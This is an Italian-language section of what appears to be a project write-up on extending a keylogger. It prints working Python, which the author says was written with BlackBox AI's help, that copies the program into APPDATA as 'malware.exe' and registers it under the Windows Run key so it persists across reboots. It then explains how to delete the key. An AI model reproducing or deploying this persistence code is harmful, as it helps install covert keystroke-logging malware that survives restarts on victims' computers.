## Modifiche al keylogger

Questa parte del codice, aggiunta a quello precedentemente citato del keylogger+InterfacciaUtente, permette di ottenere persistence contro il riavvio o lo spegnimento del computer, l'ho programmata con l'aiuto di BlackBox AI [[10]](https://www.blackbox.ai/). 

Questo codice è funzionante:

```python
import os
import shutil
import sys
import winreg as reg

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    
    # Copia il file nella directory persistente
    persistent_path = os.path.join(os.environ["APPDATA"], "malware.exe")
    shutil.copyfile(file_path, persistent_path)
    
    # Crea una chiave di registro per avviare il malware all'avvio
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    key_name = "MaliciousApp"
    
    open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open_key, key_name, 0, reg.REG_SZ, persistent_path)
    reg.CloseKey(open_key)

if __name__ == "__main__":
    # Verifica se il file è già stato copiato nella directory persistente
    if not os.path.exists(os.path.join(os.environ["APPDATA"], "malware.exe")):
        add_to_startup(sys.argv[0])
```

Dopo aver eseguito lo script, per rimuovere la chiave dal registro bisogna accedere alla utility regedit dal prompt dei comandi con l'identità dell'amministratore, selezionare il seguente percorso: "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", e cancellare la chiave "MaliciousApp" (definita nel codice soprastante).

